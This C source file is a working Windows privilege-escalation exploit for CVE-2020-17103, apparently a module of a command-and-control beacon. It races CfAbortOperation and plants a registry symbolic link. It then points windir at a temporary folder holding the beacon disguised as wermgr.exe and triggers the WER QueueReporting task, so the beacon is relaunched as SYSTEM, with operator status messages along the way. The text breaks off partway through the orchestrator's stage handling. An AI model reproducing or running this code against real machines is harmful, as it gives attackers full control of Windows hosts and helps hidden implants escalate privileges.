// CVE-2020-17103 (CfAbortOperation race) privilege escalation to SYSTEM.
// Adapted from MiniPlasma PoC (James Forshaw / Project Zero technique).
// No-CRT, WinAPI-only.  Multi-process: stages 1-2 race CfAbortOperation,
// stage 3 hijacks WER QueueReporting, SystemPayload spawns beacon as SYSTEM.

#include "../core/beacon.h"
#include <sddl.h>

// ---------------------------------------------------------------------------
// NT types and function pointers
// ---------------------------------------------------------------------------

// NTSTATUS already typedef'd via winternl.h (included by beacon.h)
#define PL_NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#define PL_STATUS_NOTIFY_ENUM_DIR ((NTSTATUS)0x0000010CL)

#define PL_OBJ_CASE_INSENSITIVE 0x00000040L
#define PL_OBJ_OPENLINK         0x00000100L

typedef struct _PL_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} PL_UNICODE_STRING, *PPL_UNICODE_STRING;

typedef struct _PL_OBJECT_ATTRIBUTES {
    ULONG              Length;
    HANDLE             RootDirectory;
    PPL_UNICODE_STRING ObjectName;
    ULONG              Attributes;
    PVOID              SecurityDescriptor;
    PVOID              SecurityQualityOfService;
} PL_OBJECT_ATTRIBUTES, *PPL_OBJECT_ATTRIBUTES;

#define PL_InitOA(p, n, a, r, s) { \
    (p)->Length = sizeof(PL_OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = (r); \
    (p)->ObjectName = (n); \
    (p)->Attributes = (a); \
    (p)->SecurityDescriptor = (s); \
    (p)->SecurityQualityOfService = NULL; \
}

typedef struct _PL_IO_STATUS_BLOCK {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} PL_IO_STATUS_BLOCK, *PPL_IO_STATUS_BLOCK;

typedef VOID (NTAPI *PL_PIO_APC_ROUTINE)(PVOID, PPL_IO_STATUS_BLOCK, ULONG);

typedef enum _PL_KEY_INFO_CLASS { PlKeyBasicInformation = 0 } PL_KEY_INFO_CLASS;

typedef struct _PL_KEY_BASIC_INFO {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} PL_KEY_BASIC_INFO;

#define PL_SI_DACL  0x00000004L
#define PL_SI_LABEL 0x00000010L
#define PL_ThreadImpersonationToken 5

// ntdll prototypes
typedef NTSTATUS (NTAPI *fn_NtOpenKey)(PHANDLE, ACCESS_MASK, PPL_OBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *fn_NtCreateKey)(PHANDLE, ACCESS_MASK, PPL_OBJECT_ATTRIBUTES, ULONG, PPL_UNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);
typedef NTSTATUS (NTAPI *fn_NtDeleteKey)(HANDLE);
typedef NTSTATUS (NTAPI *fn_NtSetValueKey)(HANDLE, PPL_UNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *fn_NtSetSecurityObject)(HANDLE, ULONG, PSECURITY_DESCRIPTOR);
typedef NTSTATUS (NTAPI *fn_NtEnumerateKey)(HANDLE, ULONG, PL_KEY_INFO_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtNotifyChangeKey)(HANDLE, HANDLE, PL_PIO_APC_ROUTINE, PVOID, PPL_IO_STATUS_BLOCK, ULONG, BOOLEAN, PVOID, ULONG, BOOLEAN);
typedef NTSTATUS (NTAPI *fn_NtImpersonateAnonymousToken)(HANDLE);
typedef NTSTATUS (NTAPI *fn_NtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
typedef VOID     (NTAPI *fn_RtlInitUnicodeString)(PPL_UNICODE_STRING, PCWSTR);

// cldapi
typedef struct { DWORD BuildNumber; DWORD RevisionNumber; DWORD IntegrationNumber; } PL_CF_PLATFORM_INFO;
typedef HRESULT (WINAPI *fn_CfAbortOperation)(DWORD, PVOID, DWORD);
typedef HRESULT (WINAPI *fn_CfGetPlatformInfo)(PL_CF_PLATFORM_INFO*);


// Grouped API table
typedef struct {
    fn_NtOpenKey                  NtOpenKey;
    fn_NtCreateKey                NtCreateKey;
    fn_NtClose                    NtClose;
    fn_NtDeleteKey                NtDeleteKey;
    fn_NtSetValueKey              NtSetValueKey;
    fn_NtSetSecurityObject        NtSetSecurityObject;
    fn_NtEnumerateKey             NtEnumerateKey;
    fn_NtNotifyChangeKey          NtNotifyChangeKey;
    fn_NtImpersonateAnonymousToken NtImpersonateAnonymousToken;
    fn_NtSetInformationThread     NtSetInformationThread;
    fn_RtlInitUnicodeString       RtlInitUnicodeString;
    fn_CfAbortOperation           CfAbortOperation;
    fn_CfGetPlatformInfo          CfGetPlatformInfo;
} PlasmaApi;

// Named pipe for SYSTEM callback synchronization
#define PL_PIPE_NAME L"\\\\.\\pipe\\Co2HPlasma"

// ---------------------------------------------------------------------------
// String helpers (no CRT)
// ---------------------------------------------------------------------------

static SIZE_T pl_wcslen(const wchar_t* s) {
    SIZE_T n = 0;
    while (s[n]) ++n;
    return n;
}

static void pl_wcscpy(wchar_t* dst, const wchar_t* src) {
    while ((*dst++ = *src++) != 0);
}

static void pl_wcscat(wchar_t* dst, const wchar_t* src) {
    while (*dst) ++dst;
    while ((*dst++ = *src++) != 0);
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

static const wchar_t PL_ROOT_KEY[]     = L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft";
static const wchar_t PL_CLOUD_FILES[]  = L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft\\CloudFiles";
static const wchar_t PL_BLOCKED_APPS[] = L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
static const wchar_t PL_TARGET_KEY[]   = L"\\Registry\\User\\.DEFAULT\\Volatile Environment";
static const wchar_t PL_SDDL_ALL[]     = L"D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)";

#define PL_MAX_STAGE 4

// ---------------------------------------------------------------------------
// Resolve API
// ---------------------------------------------------------------------------

static BOOL pl_resolve_api(PlasmaApi* a) {
    HMODULE ntdll  = GetModuleHandleW(L"ntdll.dll");
    HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
    if (!ntdll || !cldapi) return FALSE;

#define R(h, n) a->n = (fn_##n)GetProcAddress(h, #n); if (!a->n) return FALSE
    R(ntdll, NtOpenKey);
    R(ntdll, NtCreateKey);
    R(ntdll, NtClose);
    R(ntdll, NtDeleteKey);
    R(ntdll, NtSetValueKey);
    R(ntdll, NtSetSecurityObject);
    R(ntdll, NtEnumerateKey);
    R(ntdll, NtNotifyChangeKey);
    R(ntdll, NtImpersonateAnonymousToken);
    R(ntdll, NtSetInformationThread);
    R(ntdll, RtlInitUnicodeString);
    R(cldapi, CfAbortOperation);
    R(cldapi, CfGetPlatformInfo);
#undef R
    return TRUE;
}

// ---------------------------------------------------------------------------
// Registry helpers
// ---------------------------------------------------------------------------

static void pl_init_us(const PlasmaApi* a, PPL_UNICODE_STRING us, const wchar_t* s) {
    a->RtlInitUnicodeString(us, s);
}

static HANDLE pl_open_key(const PlasmaApi* a, HANDLE root, const wchar_t* path, ACCESS_MASK access) {
    PL_UNICODE_STRING us;
    pl_init_us(a, &us, path);
    PL_OBJECT_ATTRIBUTES oa;
    PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE | PL_OBJ_OPENLINK, root, NULL);

    HANDLE h = NULL;
    NTSTATUS st = a->NtOpenKey(&h, access, &oa);
    if (PL_NT_SUCCESS(st)) return h;

    // Fallback: impersonate anonymous token, retry, revert
    NTSTATUS imp = a->NtImpersonateAnonymousToken(GetCurrentThread());
    if (!PL_NT_SUCCESS(imp)) return NULL;

    a->NtOpenKey(&h, access, &oa);

    HANDLE nullh = NULL;
    a->NtSetInformationThread(GetCurrentThread(), PL_ThreadImpersonationToken, &nullh, sizeof(HANDLE));
    return h;
}

static BOOL pl_set_sd(const PlasmaApi* a, HANDLE key, ULONG info) {
    PSECURITY_DESCRIPTOR sd = NULL;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            PL_SDDL_ALL, SDDL_REVISION_1, &sd, NULL))
        return FALSE;
    NTSTATUS st = a->NtSetSecurityObject(key, info, sd);
    LocalFree(sd);
    return PL_NT_SUCCESS(st);
}

static void pl_delete_registry_tree(const PlasmaApi* a, HANDLE root);

static void pl_force_delete_key(const PlasmaApi* a, HANDLE root, const wchar_t* name) {
    HANDLE key = pl_open_key(a, root, name, WRITE_DAC);
    if (key) { pl_set_sd(a, key, PL_SI_DACL); a->NtClose(key); }

    key = pl_open_key(a, root, name, WRITE_OWNER);
    if (key) { pl_set_sd(a, key, PL_SI_LABEL); a->NtClose(key); }

    key = pl_open_key(a, root, name, DELETE | KEY_ENUMERATE_SUB_KEYS);
    if (key) {
        pl_delete_registry_tree(a, key);
        a->NtDeleteKey(key);
        a->NtClose(key);
    }
}

static void pl_delete_registry_tree(const PlasmaApi* a, HANDLE root) {
    for (;;) {
        BYTE buf[1024];
        ULONG len = 0;
        NTSTATUS st = a->NtEnumerateKey(root, 0, PlKeyBasicInformation, buf, sizeof(buf), &len);
        if (!PL_NT_SUCCESS(st)) break;
        PL_KEY_BASIC_INFO* kbi = (PL_KEY_BASIC_INFO*)buf;
        wchar_t name[260];
        ULONG chars = kbi->NameLength / sizeof(wchar_t);
        if (chars >= 260) chars = 259;
        for (ULONG i = 0; i < chars; ++i) name[i] = kbi->Name[i];
        name[chars] = 0;
        pl_force_delete_key(a, root, name);
    }
}

// ---------------------------------------------------------------------------
// Race threads
// ---------------------------------------------------------------------------

typedef struct {
    const PlasmaApi* api;
    volatile BOOL*   stop;
    HANDLE           target_thread;
} PlForceTokenCtx;

static DWORD WINAPI pl_force_token_thread(LPVOID param) {
    PlForceTokenCtx* ctx = (PlForceTokenCtx*)param;
    const PlasmaApi* a = ctx->api;

    if (!ImpersonateAnonymousToken(GetCurrentThread())) return 1;
    HANDLE anon = NULL;
    if (!OpenThreadToken(GetCurrentThread(),
                        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                        TRUE, &anon)) {
        RevertToSelf();
        return 1;
    }
    RevertToSelf();

    HANDLE nullh = NULL;
    while (!*(ctx->stop)) {
        a->NtSetInformationThread(ctx->target_thread, PL_ThreadImpersonationToken, &anon, sizeof(HANDLE));
        a->NtSetInformationThread(ctx->target_thread, PL_ThreadImpersonationToken, &nullh, sizeof(HANDLE));
    }
    CloseHandle(anon);
    return 0;
}

typedef struct {
    const PlasmaApi* api;
    BOOL             watch_root_key;
} PlCheckKeyCtx;

static DWORD WINAPI pl_check_key_thread(LPVOID param) {
    PlCheckKeyCtx* ctx = (PlCheckKeyCtx*)param;
    const PlasmaApi* a = ctx->api;
    const wchar_t* path = ctx->watch_root_key
        ? PL_ROOT_KEY
        : L"\\Registry\\User\\.DEFAULT";

    PL_UNICODE_STRING us;
    pl_init_us(a, &us, path);
    PL_OBJECT_ATTRIBUTES oa;
    PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS st = a->NtOpenKey(&key, MAXIMUM_ALLOWED, &oa);
    if (!PL_NT_SUCCESS(st)) return 1;

    for (;;) {
        PL_IO_STATUS_BLOCK iosb;
        st = a->NtNotifyChangeKey(key, NULL, NULL, NULL, &iosb,
                                  REG_NOTIFY_CHANGE_NAME, TRUE, NULL, 0, FALSE);
        if (st == PL_STATUS_NOTIFY_ENUM_DIR) {
            ExitProcess(0);
        }
    }
}

// ---------------------------------------------------------------------------
// Stage 1 — Race CfAbortOperation
// ---------------------------------------------------------------------------

static void pl_stage1(const PlasmaApi* a, BOOL watch_root_key) {
    PlCheckKeyCtx ckCtx;
    ckCtx.api = a;
    ckCtx.watch_root_key = watch_root_key;
    CreateThread(NULL, 0, pl_check_key_thread, &ckCtx, 0, NULL);
    Sleep(1000);

    HANDLE meDup = NULL;
    DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                    GetCurrentProcess(), &meDup,
                    THREAD_SET_THREAD_TOKEN | THREAD_QUERY_INFORMATION, FALSE, 0);

    volatile BOOL stop = FALSE;
    PlForceTokenCtx ftCtx;
    ftCtx.api = a;
    ftCtx.stop = &stop;
    ftCtx.target_thread = meDup;
    CreateThread(NULL, 0, pl_force_token_thread, &ftCtx, 0, NULL);

    DWORD pid = GetCurrentProcessId();
    for (;;) {
        a->CfAbortOperation(pid, NULL, 2 /* CF_ABORT_FLAG_BLOCK */);
    }
}

// ---------------------------------------------------------------------------
// Stage 2 — Wipe CloudFiles, plant symlink, race
// ---------------------------------------------------------------------------

static BOOL pl_create_symlink(const PlasmaApi* a, const wchar_t* linkPath, const wchar_t* targetPath) {
    PL_UNICODE_STRING us;
    pl_init_us(a, &us, linkPath);
    PL_OBJECT_ATTRIBUTES oa;
    PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE | PL_OBJ_OPENLINK, NULL, NULL);

    HANDLE key = NULL;
    ULONG disp = 0;
    NTSTATUS st = a->NtCreateKey(&key, KEY_ALL_ACCESS, &oa, 0, NULL,
                                 REG_OPTION_CREATE_LINK, &disp);
    if (!PL_NT_SUCCESS(st)) return FALSE;

    PL_UNICODE_STRING vname;
    pl_init_us(a, &vname, L"SymbolicLinkValue");
    ULONG tlen = (ULONG)(pl_wcslen(targetPath) * sizeof(wchar_t));
    st = a->NtSetValueKey(key, &vname, 0, REG_LINK, (PVOID)targetPath, tlen);
    a->NtClose(key);
    return PL_NT_SUCCESS(st);
}

static void pl_stage2(const PlasmaApi* a) {
    HANDLE key = pl_open_key(a, NULL, PL_CLOUD_FILES,
                             WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
    if (key) {
        pl_set_sd(a, key, PL_SI_DACL | PL_SI_LABEL);
        pl_delete_registry_tree(a, key);
        a->NtClose(key);
    }
    pl_create_symlink(a, PL_BLOCKED_APPS, PL_TARGET_KEY);
    pl_stage1(a, FALSE);
}

// ---------------------------------------------------------------------------
// Stage 3 — WER QueueReporting exploitation
// ---------------------------------------------------------------------------

static void pl_stage3_delete_volatile_subkeys(const PlasmaApi* a) {
    HKEY hku;
    if (RegOpenKeyExW(HKEY_USERS, L".DEFAULT\\Volatile Environment", 0,
                      KEY_READ, &hku) != ERROR_SUCCESS)
        return;

    for (DWORD idx = 0; ; ++idx) {
        wchar_t name[256];
        DWORD nlen = 256;
        LONG r = RegEnumKeyExW(hku, idx, name, &nlen, NULL, NULL, NULL, NULL);
        if (r != ERROR_SUCCESS) break;

        wchar_t full[600];
        pl_wcscpy(full, PL_TARGET_KEY);
        pl_wcscat(full, L"\\");
        pl_wcscat(full, name);

        PL_UNICODE_STRING us;
        pl_init_us(a, &us, full);
        PL_OBJECT_ATTRIBUTES oa;
        PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE sub = NULL;
        NTSTATUS st = a->NtOpenKey(&sub, WRITE_DAC, &oa);
        if (!PL_NT_SUCCESS(st)) sub = pl_open_key(a, NULL, full, WRITE_DAC);
        if (sub) { pl_set_sd(a, sub, PL_SI_DACL); a->NtClose(sub); }

        sub = NULL;
        st = a->NtOpenKey(&sub, DELETE, &oa);
        if (PL_NT_SUCCESS(st)) { a->NtDeleteKey(sub); a->NtClose(sub); }
    }
    RegCloseKey(hku);
}

static BOOL pl_trigger_wer_task(void) {
    // Use schtasks.exe to trigger WER QueueReporting — avoids COM dependency
    // which can fail if beacon's imported DLLs pre-initialize COM.
    wchar_t cmd[] = L"schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"";
    STARTUPINFOW si;
    rt_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return FALSE;

    WaitForSingleObject(pi.hProcess, 10000);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (exitCode == 0);
}

static void pl_stage3(const PlasmaApi* a) {
    // 1. Remove symlink BlockedApps
    HANDLE key = pl_open_key(a, NULL, PL_BLOCKED_APPS, DELETE);
    if (key) { a->NtDeleteKey(key); a->NtClose(key); }

    // 2. Rewrite ACL on Volatile Environment
    key = pl_open_key(a, NULL, PL_TARGET_KEY, WRITE_DAC | WRITE_OWNER);
    if (key) { pl_set_sd(a, key, PL_SI_DACL | PL_SI_LABEL); a->NtClose(key); }

    // 3. Delete subkeys
    pl_stage3_delete_volatile_subkeys(a);

    // 4. Build fake windir in %TEMP%\co2h_XXXXXXXX\System32
    wchar_t tempBase[MAX_PATH];
    GetTempPathW(MAX_PATH, tempBase);

    // Generate pseudo-random suffix from tick count
    DWORD tick = GetTickCount();
    wchar_t fakeWinDir[MAX_PATH];
    pl_wcscpy(fakeWinDir, tempBase);
    pl_wcscat(fakeWinDir, L"co2h_");
    {
        wchar_t hexbuf[9];
        for (int hi = 7; hi >= 0; --hi) {
            int nib = tick & 0xF;
            hexbuf[hi] = (wchar_t)(nib < 10 ? L'0' + nib : L'a' + nib - 10);
            tick >>= 4;
        }
        hexbuf[8] = 0;
        pl_wcscat(fakeWinDir, hexbuf);
    }
    CreateDirectoryW(fakeWinDir, NULL);

    // Set windir = fake temp dir in Volatile Environment
    {
        PL_UNICODE_STRING us;
        pl_init_us(a, &us, PL_TARGET_KEY);
        PL_OBJECT_ATTRIBUTES oa;
        PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE k2 = NULL;
        NTSTATUS st = a->NtOpenKey(&k2, KEY_SET_VALUE, &oa);
        if (!PL_NT_SUCCESS(st)) return;
        PL_UNICODE_STRING vn;
        pl_init_us(a, &vn, L"windir");
        ULONG bytes = (ULONG)((pl_wcslen(fakeWinDir) + 1) * sizeof(wchar_t));
        a->NtSetValueKey(k2, &vn, 0, REG_SZ, fakeWinDir, bytes);
        a->NtClose(k2);
    }

    // 5. Create fake System32\wermgr.exe (copy of beacon) in temp dir
    wchar_t fakeSys32[MAX_PATH];
    pl_wcscpy(fakeSys32, fakeWinDir);
    pl_wcscat(fakeSys32, L"\\System32");
    CreateDirectoryW(fakeSys32, NULL);

    wchar_t fakeWer[MAX_PATH];
    pl_wcscpy(fakeWer, fakeSys32);
    pl_wcscat(fakeWer, L"\\wermgr.exe");

    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    CopyFileW(self, fakeWer, FALSE);

    // 6. Create named pipe for SYSTEM callback synchronization
    HANDLE pipe = CreateNamedPipeW(PL_PIPE_NAME,
                                   PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                   PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                   1, 4096, 4096, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE) return;

    OVERLAPPED ov;
    rt_memset(&ov, 0, sizeof(ov));
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    BOOL cpOk = ConnectNamedPipe(pipe, &ov);
    if (!cpOk) {
        DWORD le = GetLastError();
        if (le == ERROR_PIPE_CONNECTED) SetEvent(ov.hEvent);
        else if (le != ERROR_IO_PENDING) {
            CloseHandle(ov.hEvent);
            CloseHandle(pipe);
            return;
        }
    }

    // 7. Trigger WER QueueReporting (runs as SYSTEM)
    if (!pl_trigger_wer_task()) {
        CloseHandle(ov.hEvent);
        CloseHandle(pipe);
        Sleep(1000);
        DeleteFileW(fakeWer);
        RemoveDirectoryW(fakeSys32);
        RemoveDirectoryW(fakeWinDir);
        ExitProcess(4); // 4 = WER trigger failed (COM/TaskScheduler error)
    }

    // 8. Wait for SYSTEM client to connect (60 seconds — WER task may be delayed)
    DWORD wr = WaitForSingleObject(ov.hEvent, 60000);
    if (wr != WAIT_OBJECT_0) {
        CancelIoEx(pipe, &ov);
        CloseHandle(ov.hEvent);
        CloseHandle(pipe);
        // Cleanup and exit with code 2 = pipe timeout (WER didn't connect)
        Sleep(1000);
        DeleteFileW(fakeWer);
        RemoveDirectoryW(fakeSys32);
        RemoveDirectoryW(fakeWinDir);
        ExitProcess(2);
    }

    CloseHandle(ov.hEvent);

    // 9. Client connected — read confirmation byte from SystemPayload (5s timeout).
    //    'K' = CreateProcessAsUserW succeeded, anything else = fail.
    BYTE confirmByte = 0;
    DWORD bytesRead = 0;
    OVERLAPPED ov2;
    rt_memset(&ov2, 0, sizeof(ov2));
    ov2.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    ReadFile(pipe, &confirmByte, 1, NULL, &ov2);
    DWORD wr2 = WaitForSingleObject(ov2.hEvent, 5000);
    if (wr2 == WAIT_OBJECT_0) {
        GetOverlappedResult(pipe, &ov2, &bytesRead, FALSE);
    }
    CloseHandle(ov2.hEvent);
    CloseHandle(pipe);

    // 10. Cleanup temp dir
    Sleep(1000);
    DeleteFileW(fakeWer);
    RemoveDirectoryW(fakeSys32);
    RemoveDirectoryW(fakeWinDir);

    // Restore Volatile Environment
    key = NULL;
    {
        PL_UNICODE_STRING us;
        pl_init_us(a, &us, PL_TARGET_KEY);
        PL_OBJECT_ATTRIBUTES oa;
        PL_InitOA(&oa, &us, PL_OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (PL_NT_SUCCESS(a->NtOpenKey(&key, DELETE, &oa))) {
            a->NtDeleteKey(key);
            a->NtClose(key);
        }
    }

    // Exit code indicates result:
    // 0 = client connected AND sent 'K' (spawn success)
    // 3 = client connected but no confirmation (spawn failed)
    if (bytesRead == 1 && confirmByte == 'K')
        ExitProcess(0);
    else
        ExitProcess(3);
}

// ---------------------------------------------------------------------------
// SystemPayload — called from exe_entry when running as SYSTEM (fake wermgr.exe).
// Connects to pipe → GetNamedPipeServerSessionId → DuplicateTokenEx →
// SetTokenInformation(SessionId) → CreateProcessAsUserW (spawn beacon as SYSTEM
// in user's session) → ExitProcess.
// If pipe doesn't exist — returns (normal SYSTEM beacon, not plasma-launched).
// ---------------------------------------------------------------------------

void plasma_system_payload(void) {
    // Fix environment — windir may point to the fake directory
    SetEnvironmentVariableW(L"windir", L"C:\\Windows");

    // Try to connect to pipe created by Stage 3.
    // If pipe doesn't exist — we're a normal SYSTEM beacon, just return.
    HANDLE pipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 50 && pipe == INVALID_HANDLE_VALUE; ++i) {
        pipe = CreateFileW(PL_PIPE_NAME,
                           GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
        if (pipe == INVALID_HANDLE_VALUE) Sleep(100);
    }
    if (pipe == INVALID_HANDLE_VALUE) return;

    // Get the session ID of the pipe server (Stage 3 running in user's session).
    ULONG sessionId = 0;
    if (!GetNamedPipeServerSessionId(pipe, &sessionId)) {
        BYTE fb = 'F'; DWORD bw = 0;
        WriteFile(pipe, &fb, 1, &bw, NULL);
        CloseHandle(pipe);
        ExitProcess(1);
    }

    // Duplicate our SYSTEM token as a primary token for CreateProcessAsUserW.
    HANDLE tok = NULL, dupTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                          TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                          &tok)) {
        BYTE fb = 'F'; DWORD bw = 0;
        WriteFile(pipe, &fb, 1, &bw, NULL);
        CloseHandle(pipe);
        ExitProcess(1);
    }
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &dupTok)) {
        CloseHandle(tok);
        BYTE fb = 'F'; DWORD bw = 0;
        WriteFile(pipe, &fb, 1, &bw, NULL);
        CloseHandle(pipe);
        ExitProcess(1);
    }
    CloseHandle(tok);

    // Set the duplicated token's session ID to the user's session.
    SetTokenInformation(dupTok, TokenSessionId, &sessionId, sizeof(sessionId));

    // Mark env so the spawned beacon skips plasma_system_payload (no pipe loop).
    SetEnvironmentVariableW(L"CO2H_PLASMA", L"S");

    // Spawn ourselves as SYSTEM in the user's session -> new SYSTEM beacon.
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    STARTUPINFOW si;
    rt_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));

    wchar_t cmd[MAX_PATH + 4];
    cmd[0] = L'"';
    SIZE_T slen = pl_wcslen(selfPath);
    for (SIZE_T j = 0; j < slen; ++j) cmd[1 + j] = selfPath[j];
    cmd[1 + slen] = L'"';
    cmd[2 + slen] = 0;

    BOOL spawned = CreateProcessAsUserW(dupTok, NULL, cmd, NULL, NULL, FALSE,
                                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    CloseHandle(dupTok);

    // Write confirmation byte to pipe for Stage 3 to read.
    BYTE statusByte = spawned ? 'K' : 'F';
    DWORD bw = 0;
    WriteFile(pipe, &statusByte, 1, &bw, NULL);
    CloseHandle(pipe);

    // This process (fake wermgr.exe) is done — exit.
    ExitProcess(0);
}

// ---------------------------------------------------------------------------
// Entry point for child processes (called from exe_entry.c when env var set)
// ---------------------------------------------------------------------------

void plasma_stage_entry(int stage) {
    PlasmaApi api;
    if (!pl_resolve_api(&api)) ExitProcess(1);

    switch (stage) {
        case 1: pl_stage1(&api, TRUE);  break;
        case 2: pl_stage2(&api);        break;
        case 3: pl_stage3(&api);        break;
        default: break;
    }
}

// ---------------------------------------------------------------------------
// Beacon command handler (Stage 0 — orchestrator)
// ---------------------------------------------------------------------------

void cmd_privesc_plasma(const BeaconTask* t) {
    (void)t;

    // Check Cloud Files platform availability
    PlasmaApi api;
    if (!pl_resolve_api(&api)) {
        const char err[] = "[-] plasma: failed to resolve ntdll/cldapi APIs\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    PL_CF_PLATFORM_INFO cfpi;
    rt_memset(&cfpi, 0, sizeof(cfpi));
    HRESULT hr = api.CfGetPlatformInfo(&cfpi);
    if (FAILED(hr)) {
        const char err[] = "[-] plasma: CfGetPlatformInfo failed - Cloud Files not available\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    {
        const char m[] = "[*] plasma: Cloud Files platform OK\n";
        out_write(m, sizeof(m) - 1);
    }

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    // Launch stages 1..3 sequentially as child processes.
    for (int i = 1; i < PL_MAX_STAGE; ++i) {
        // Log stage start
        if (i == 1) {
            const char m[] = "[*] plasma: stage 1 - racing CfAbortOperation (watch root key)...\n";
            out_write(m, sizeof(m) - 1);
        } else if (i == 2) {
            const char m[] = "[*] plasma: stage 2 - planting symlink + race (watch .DEFAULT)...\n";
            out_write(m, sizeof(m) - 1);
        } else if (i == 3) {
            const char m[] = "[*] plasma: stage 3 - WER QueueReporting hijack...\n";
            out_write(m, sizeof(m) - 1);
        }

        wchar_t stageStr[4];
        stageStr[0] = (wchar_t)(L'0' + i);
        stageStr[1] = 0;
        SetEnvironmentVariableW(L"CO2H_PLASMA", stageStr);

        STARTUPINFOW si;
        rt_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        PROCESS_INFORMATION proc_info;
        rt_memset(&proc_info, 0, sizeof(proc_info));

        wchar_t cmd[MAX_PATH + 4];
        cmd[0] = L'"';
        SIZE_T slen = pl_wcslen(selfPath);
        for (SIZE_T j = 0; j < slen; ++j) cmd[1 + j] = selfPath[j];
        cmd[1 + slen] = L'"';
        cmd[2 + slen] = 0;

        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &proc_info)) {
            const char err[] = "[-] plasma: CreateProcess failed for stage\n";
            out_write(err, sizeof(err) - 1);
            SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
            return;
        }

        // Stages 1-2 race CfAbortOperation — may loop forever if vuln is patched.
        // Timeout after 30s to avoid hanging the beacon.
        DWORD waitRes = WaitForSingleObject(proc_info.hProcess, 30000);
        if (waitRes == WAIT_TIMEOUT) {
            TerminateProcess(proc_info.hProcess, 0xDEAD);
            WaitForSingleObject(proc_info.hProcess, 5000);
        }

        DWORD exitCode = 0;
        GetExitCodeProcess(proc_info.hProcess, &exitCode);
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);

        if (i == 1) {
            if (exitCode == 0xDEAD) {
                const char e[] = "[-] plasma: stage 1 timeout (30s) - race did not win, CVE likely patched on this OS\n";
                out_write(e, sizeof(e) - 1);
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                return;
            }
            if (exitCode != 0) {
                char e[80] = "[-] plasma: stage 1 failed (exit code 0x";
                DWORD ec = exitCode;
                char* p = e + 40;
                for (int sh = 28; sh >= 0; sh -= 4) {
                    int nib = (ec >> sh) & 0xF;
                    *p++ = (char)(nib < 10 ? '0' + nib : 'A' + nib - 10);
                }
                *p++ = ')'; *p++ = '\n'; *p = 0;
                out_write(e, (int)(p - e));
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                return;
            }
            const char m[] = "[+] plasma: stage 1 done - race won, key created\n";
            out_write(m, sizeof(m) - 1);
        } else if (i == 2) {
